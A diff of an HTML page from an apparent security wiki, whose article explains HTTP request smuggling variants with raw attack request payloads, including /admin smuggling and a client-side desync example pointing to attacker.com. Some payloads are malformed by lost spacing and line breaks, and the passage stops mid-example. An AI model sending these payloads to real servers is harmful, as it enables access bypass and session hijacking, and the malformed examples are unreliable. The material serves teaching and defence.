@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="HTTP Request Smuggling # HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can &ldquo;smuggle&rdquo; a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.
-Fundamentals of HTTP Request Smuggling # Why Does This Happen?">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="HTTP Request Smuggling" />
-<meta property="og:description" content="HTTP Request Smuggling # HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can &ldquo;smuggle&rdquo; a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.
-Fundamentals of HTTP Request Smuggling # Why Does This Happen?" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>HTTP Request Smuggling | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTTP Request Smuggling# HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can “smuggle” a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.
+Fundamentals of HTTP Request Smuggling# Why Does This Happen?# Modern web infrastructure typically chains multiple servers:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="HTTP Request Smuggling">
+	<meta property="og:description" content="HTTP Request Smuggling# HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can “smuggle” a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.
+Fundamentals of HTTP Request Smuggling# Why Does This Happen?# Modern web infrastructure typically chains multiple servers:">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="HTTP Request Smuggling">
+	<meta itemprop="description" content="HTTP Request Smuggling# HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can “smuggle” a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.
+Fundamentals of HTTP Request Smuggling# Why Does This Happen?# Modern web infrastructure typically chains multiple servers:">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2006">
+
+<title>HTTP Request Smuggling • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>HTTP Request Smuggling</strong>
+  <h3>HTTP Request Smuggling</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1315,33 +1313,20 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="http-request-smuggling">
-  HTTP Request Smuggling
-  <a class="anchor" href="#http-request-smuggling">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="http-request-smuggling">HTTP Request Smuggling<a class="anchor" href="#http-request-smuggling">#</a></h1>
 <p>HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can &ldquo;smuggle&rdquo; a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.</p>
 <hr>
-<h2 id="fundamentals-of-http-request-smuggling">
-  <strong>Fundamentals of HTTP Request Smuggling</strong>
-  <a class="anchor" href="#fundamentals-of-http-request-smuggling">#</a>
-</h2>
-<h3 id="why-does-this-happen">
-  <strong>Why Does This Happen?</strong>
-  <a class="anchor" href="#why-does-this-happen">#</a>
-</h3>
+<h2 id="fundamentals-of-http-request-smuggling"><strong>Fundamentals of HTTP Request Smuggling</strong><a class="anchor" href="#fundamentals-of-http-request-smuggling">#</a></h2>
+<h3 id="why-does-this-happen"><strong>Why Does This Happen?</strong><a class="anchor" href="#why-does-this-happen">#</a></h3>
 <p>Modern web infrastructure typically chains multiple servers:</p>
-<pre tabindex="0"><code>Browser → Front-end (CDN/Load Balancer/Reverse Proxy) → Back-end Server
-</code></pre><p>To improve performance, the front-end maintains persistent TCP connections with the back-end and uses <strong>HTTP pipelining</strong>—sending multiple requests over a single connection without waiting for responses. The back-end processes these requests in FIFO (First In, First Out) order.</p>
+<pre tabindex="0"><code>Browser → Front-end (CDN/Load Balancer/Reverse Proxy) → Back-end Server</code></pre><p>To improve performance, the front-end maintains persistent TCP connections with the back-end and uses <strong>HTTP pipelining</strong>—sending multiple requests over a single connection without waiting for responses. The back-end processes these requests in FIFO (First In, First Out) order.</p>
 <p>The problem arises because HTTP/1.1 provides two ways to specify request body length:</p>
 <ul>
 <li><strong>Content-Length (CL):</strong> Specifies exact byte count of the body</li>
 <li><strong>Transfer-Encoding (TE):</strong> Uses chunked encoding where body is sent in chunks, terminated by a zero-length chunk</li>
 </ul>
 <p>When front-end and back-end servers interpret these headers differently, the boundary between requests becomes ambiguous—this is the core of request smuggling.</p>
-<h3 id="http10-vs-http11-connection-behavior">
-  <strong>HTTP/1.0 vs HTTP/1.1 Connection Behavior</strong>
-  <a class="anchor" href="#http10-vs-http11-connection-behavior">#</a>
-</h3>
+<h3 id="http10-vs-http11-connection-behavior"><strong>HTTP/1.0 vs HTTP/1.1 Connection Behavior</strong><a class="anchor" href="#http10-vs-http11-connection-behavior">#</a></h3>
 <p><strong>HTTP/1.0:</strong></p>
 <ul>
 <li>One TCP connection per request-response cycle</li>
@@ -1356,14 +1341,8 @@ https://github.com/alex-shpak/hugo-book
 <li>Smuggling becomes possible when servers disagree on request boundaries</li>
 </ul>
 <hr>
-<h2 id="types-of-request-smuggling-attacks">
-  <strong>Types of Request Smuggling Attacks</strong>
-  <a class="anchor" href="#types-of-request-smuggling-attacks">#</a>
-</h2>
-<h3 id="1-clte-content-length-vs-transfer-encoding">
-  <strong>1. CL.TE (Content-Length vs Transfer-Encoding)</strong>
-  <a class="anchor" href="#1-clte-content-length-vs-transfer-encoding">#</a>
-</h3>
+<h2 id="types-of-request-smuggling-attacks"><strong>Types of Request Smuggling Attacks</strong><a class="anchor" href="#types-of-request-smuggling-attacks">#</a></h2>
+<h3 id="1-clte-content-length-vs-transfer-encoding"><strong>1. CL.TE (Content-Length vs Transfer-Encoding)</strong><a class="anchor" href="#1-clte-content-length-vs-transfer-encoding">#</a></h3>
 <p><strong>Scenario:</strong> Front-end uses <code>Content-Length</code>, back-end uses <code>Transfer-Encoding</code></p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:vulnerable.com
@@ -1372,17 +1351,13 @@ Transfer-Encoding:chunked
 
 0
 
-SMUGGLED
-</code></pre><p><strong>What happens:</strong></p>
+SMUGGLED</code></pre><p><strong>What happens:</strong></p>
 <ul>
 <li>Front-end sees <code>Content-Length: 13</code> and forwards 13 bytes (<code>0\r\n\r\nSMUGGLED</code>)</li>
 <li>Back-end sees <code>Transfer-Encoding: chunked</code>, reads until <code>0\r\n\r\n</code> (end of chunked body)</li>
 <li><code>SMUGGLED</code> is left in the buffer as the start of the next request</li>
 </ul>
-<h3 id="2-tecl-transfer-encoding-vs-content-length">
-  <strong>2. TE.CL (Transfer-Encoding vs Content-Length)</strong>
-  <a class="anchor" href="#2-tecl-transfer-encoding-vs-content-length">#</a>
-</h3>
+<h3 id="2-tecl-transfer-encoding-vs-content-length"><strong>2. TE.CL (Transfer-Encoding vs Content-Length)</strong><a class="anchor" href="#2-tecl-transfer-encoding-vs-content-length">#</a></h3>
 <p><strong>Scenario:</strong> Front-end uses <code>Transfer-Encoding</code>, back-end uses <code>Content-Length</code></p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:vulnerable.com
@@ -1391,17 +1366,13 @@ Transfer-Encoding:chunked
 
 8
 SMUGGLED
-0
-</code></pre><p><strong>What happens:</strong></p>
+0</code></pre><p><strong>What happens:</strong></p>
 <ul>
 <li>Front-end processes chunked encoding, forwards entire body</li>
 <li>Back-end sees <code>Content-Length: 3</code>, reads only 3 bytes (<code>8\r\n</code>)</li>
 <li>Remaining data (<code>SMUGGLED\r\n0\r\n\r\n</code>) becomes the next request</li>
 </ul>
-<h3 id="3-tete-transfer-encoding-obfuscation">
-  <strong>3. TE.TE (Transfer-Encoding Obfuscation)</strong>
-  <a class="anchor" href="#3-tete-transfer-encoding-obfuscation">#</a>
-</h3>
+<h3 id="3-tete-transfer-encoding-obfuscation"><strong>3. TE.TE (Transfer-Encoding Obfuscation)</strong><a class="anchor" href="#3-tete-transfer-encoding-obfuscation">#</a></h3>
 <p><strong>Scenario:</strong> Both servers support TE, but one can be tricked into ignoring it through obfuscation</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:vulnerable.com
@@ -1410,8 +1381,7 @@ Transfer-Encoding:chunked
 Transfer-Encoding:x
 26
 GPOST / HTTP/1.1
-Content-Length:100
-</code></pre><p>Common TE obfuscation techniques:</p>
+Content-Length:100</code></pre><p>Common TE obfuscation techniques:</p>
 <pre tabindex="0"><code>Transfer-Encoding:xchunked
 
 Transfer-Encoding:chunked
@@ -1426,11 +1396,7 @@ Transfer-Encoding: chunked
 
 X:X[\n]Transfer-Encoding: chunked
 Transfer-Encoding
-: chunked
-</code></pre><h3 id="4-clcl-content-length-vs-content-length">
-  <strong>4. CL.CL (Content-Length vs Content-Length)</strong>
-  <a class="anchor" href="#4-clcl-content-length-vs-content-length">#</a>
-</h3>
+: chunked</code></pre><h3 id="4-clcl-content-length-vs-content-length"><strong>4. CL.CL (Content-Length vs Content-Length)</strong><a class="anchor" href="#4-clcl-content-length-vs-content-length">#</a></h3>
 <p><strong>Scenario:</strong> Both frontend and backend rely on the <code>Content-Length</code> header, but they interpret <strong>multiple <code>Content-Length</code> headers differently</strong>. One server uses the first value, while the other uses the last (or rejects one and accepts the other).</p>
 <pre tabindex="0"><code>POST / HTTP/1.1
 Host: vulnerable.com
@@ -1438,8 +1404,7 @@ Content-Length: 5
 Content-Length: 45
 
 ABCDEGET /admin HTTP/1.1
-Host: vulnerable.com
-</code></pre><p><strong>What happens:</strong></p>
+Host: vulnerable.com</code></pre><p><strong>What happens:</strong></p>
 <ul>
 <li>Front-end uses the <strong>first</strong> <code>Content-Length</code> (<code>5</code>) and forwards only <code>ABCDE</code> as the request body.</li>
 <li>Back-end uses the <strong>second</strong> <code>Content-Length</code> (<code>45</code>) and continues reading additional bytes.</li>
@@ -1452,18 +1417,14 @@ Host: vulnerable.com
 <li>Legacy proxies or misconfigured HTTP intermediaries fail to reject conflicting <code>Content-Length</code> headers.</li>
 </ul>
 <hr>
-<h3 id="5-0cl-zero-content-length-desync">
-  <strong>5. 0.CL (Zero Content-Length Desync)</strong>
-  <a class="anchor" href="#5-0cl-zero-content-length-desync">#</a>
-</h3>
+<h3 id="5-0cl-zero-content-length-desync"><strong>5. 0.CL (Zero Content-Length Desync)</strong><a class="anchor" href="#5-0cl-zero-content-length-desync">#</a></h3>
 <p><strong>Scenario:</strong> The frontend treats the request as having <strong>no body</strong> (<code>Content-Length: 0</code>), while the backend continues reading additional bytes because of protocol inconsistencies or connection reuse.</p>
 <pre tabindex="0"><code>POST / HTTP/1.1
 Host: vulnerable.com
 Content-Length: 0
 
 GET /admin HTTP/1.1
-Host: vulnerable.com
-</code></pre><p><strong>What happens:</strong></p>
+Host: vulnerable.com</code></pre><p><strong>What happens:</strong></p>
 <ul>
 <li>Front-end immediately considers the request complete because <code>Content-Length</code> is <code>0</code>.</li>
 <li>The connection remains open, and the extra bytes are forwarded over the same backend connection.</li>
@@ -1476,36 +1437,17 @@ Host: vulnerable.com
 <li>Reverse proxies that incorrectly forward additional bytes after a zero-length request.</li>
 <li>Browser-powered desynchronization attacks.</li>
 </ul>
-<h3 id="6-http2-downgrade-smuggling">
-  <strong>6. HTTP/2 Downgrade Smuggling</strong>
-  <a class="anchor" href="#6-http2-downgrade-smuggling">#</a>
-</h3>
+<h3 id="6-http2-downgrade-smuggling"><strong>6. HTTP/2 Downgrade Smuggling</strong><a class="anchor" href="#6-http2-downgrade-smuggling">#</a></h3>
 <p>When front-end speaks HTTP/2 but back-end only supports HTTP/1.1, the front-end must translate. This translation can introduce smuggling opportunities.</p>
 <p><strong>H2.CL Smuggling:</strong></p>
-<pre tabindex="0"><code>:method: POST:path: /:authority: vulnerable.comcontent-length: 0GET /admin HTTP/1.1Host: vulnerable.com
-</code></pre><p><strong>H2.TE Smuggling:</strong></p>
-<pre tabindex="0"><code>:method: POST:path: /:authority: vulnerable.comtransfer-encoding: chunked0GET /admin HTTP/1.1Host: vulnerable.com
-</code></pre><h3 id="7-request-tunneling">
-  <strong>7. Request Tunneling</strong>
-  <a class="anchor" href="#7-request-tunneling">#</a>
-</h3>
+<pre tabindex="0"><code>:method: POST:path: /:authority: vulnerable.comcontent-length: 0GET /admin HTTP/1.1Host: vulnerable.com</code></pre><p><strong>H2.TE Smuggling:</strong></p>
+<pre tabindex="0"><code>:method: POST:path: /:authority: vulnerable.comtransfer-encoding: chunked0GET /admin HTTP/1.1Host: vulnerable.com</code></pre><h3 id="7-request-tunneling"><strong>7. Request Tunneling</strong><a class="anchor" href="#7-request-tunneling">#</a></h3>
 <p>When back-end doesn&rsquo;t support keep-alive connections, traditional smuggling fails. However, you can still tunnel requests within a single response:</p>
-<pre tabindex="0"><code>POST /tunnelHTTP/1.1Host:vulnerable.comContent-Length:55Connection:keep-aliveGET /adminHTTP/1.1Host:vulnerable.comX-Ignore:X
-</code></pre><h3 id="8-client-side-desync">
-  <strong>8. Client-Side Desync</strong>
-  <a class="anchor" href="#8-client-side-desync">#</a>
-</h3>
+<pre tabindex="0"><code>POST /tunnelHTTP/1.1Host:vulnerable.comContent-Length:55Connection:keep-aliveGET /adminHTTP/1.1Host:vulnerable.comX-Ignore:X</code></pre><h3 id="8-client-side-desync"><strong>8. Client-Side Desync</strong><a class="anchor" href="#8-client-side-desync">#</a></h3>
 <p>Exploits browser-to-server connection reuse. Attacker tricks victim&rsquo;s browser into sending a smuggled request:</p>
-<pre tabindex="0"><code>POST /HTTP/1.1Host:vulnerable.comContent-Length:34GET /evilHTTP/1.1Host:attacker.com
-</code></pre><hr>
-<h2 id="attack-surfaces">
-  <strong>Attack Surfaces</strong>
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
-<h3 id="infrastructure-components">
-  <strong>Infrastructure Components</strong>
-  <a class="anchor" href="#infrastructure-components">#</a>
-</h3>
+<pre tabindex="0"><code>POST /HTTP/1.1Host:vulnerable.comContent-Length:34GET /evilHTTP/1.1Host:attacker.com</code></pre><hr>
+<h2 id="attack-surfaces"><strong>Attack Surfaces</strong><a class="anchor" href="#attack-surfaces">#</a></h2>
+<h3 id="infrastructure-components"><strong>Infrastructure Components</strong><a class="anchor" href="#infrastructure-components">#</a></h3>
 <ul>
 <li><strong>CDNs:</strong> Cloudflare, Akamai, Fastly, AWS CloudFront</li>
 <li><strong>Load Balancers:</strong> HAProxy, F5, AWS ALB/ELB, nginx</li>
@@ -1513,20 +1455,14 @@ Host: vulnerable.com
 <li><strong>API Gateways:</strong> Kong, AWS API Gateway</li>
 <li><strong>Web Application Firewalls (WAF)</strong></li>
 </ul>
-<h3 id="vulnerable-configurations">
-  <strong>Vulnerable Configurations</strong>
-  <a class="anchor" href="#vulnerable-configurations">#</a>
-</h3>
+<h3 id="vulnerable-configurations"><strong>Vulnerable Configurations</strong><a class="anchor" href="#vulnerable-configurations">#</a></h3>
 <ul>
 <li>Mixed HTTP versions (HTTP/2 frontend + HTTP/1.1 backend)</li>
 <li>Servers with different CL/TE priority handling</li>
 <li>Proxies that normalize or modify headers inconsistently</li>
 <li>Systems allowing ambiguous header formatting</li>
 </ul>
-<h3 id="high-value-targets">
-  <strong>High-Value Targets</strong>
-  <a class="anchor" href="#high-value-targets">#</a>
-</h3>
+<h3 id="high-value-targets"><strong>High-Value Targets</strong><a class="anchor" href="#high-value-targets">#</a></h3>
 <ul>
 <li>Authentication endpoints</li>
 <li>Admin panels behind proxy-based access controls</li>
@@ -1534,14 +1470,8 @@ Host: vulnerable.com
 <li>Applications using CDN-based caching</li>
 </ul>
 <hr>
-<h2 id="exploitation-and-bypassing-defenses">
-  <strong>Exploitation and Bypassing Defenses</strong>
-  <a class="anchor" href="#exploitation-and-bypassing-defenses">#</a>
-</h2>
-<h3 id="step-1-detect-smuggling-vulnerability">
-  <strong>Step 1: Detect Smuggling Vulnerability</strong>
-  <a class="anchor" href="#step-1-detect-smuggling-vulnerability">#</a>
-</h3>
+<h2 id="exploitation-and-bypassing-defenses"><strong>Exploitation and Bypassing Defenses</strong><a class="anchor" href="#exploitation-and-bypassing-defenses">#</a></h2>
+<h3 id="step-1-detect-smuggling-vulnerability"><strong>Step 1: Detect Smuggling Vulnerability</strong><a class="anchor" href="#step-1-detect-smuggling-vulnerability">#</a></h3>
 <p><strong>Timing-Based Detection (Safe)</strong></p>
 <p>CL.TE Detection:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
@@ -1551,8 +1481,7 @@ Content-Length:4
 
 1
 A
-X
-</code></pre><p>If vulnerable: back-end times out waiting for next chunk (you sent incomplete chunked body according to TE, but front-end sent complete body according to CL)</p>
+X</code></pre><p>If vulnerable: back-end times out waiting for next chunk (you sent incomplete chunked body according to TE, but front-end sent complete body according to CL)</p>
 <p>TE.CL Detection:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1561,8 +1490,7 @@ Content-Length:6
 
 0
 
-X
-</code></pre><p>If vulnerable: back-end times out (TE says body ended at <code>0\r\n\r\n</code>, but CL says there are 6 more bytes)</p>
+X</code></pre><p>If vulnerable: back-end times out (TE says body ended at <code>0\r\n\r\n</code>, but CL says there are 6 more bytes)</p>
 <p><strong>Differential Response Detection</strong></p>
 <p>Smuggle a request that causes different response:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
@@ -1573,12 +1501,8 @@ Transfer-Encoding:chunked
 0
 
 GET /404-test HTTP/1.1
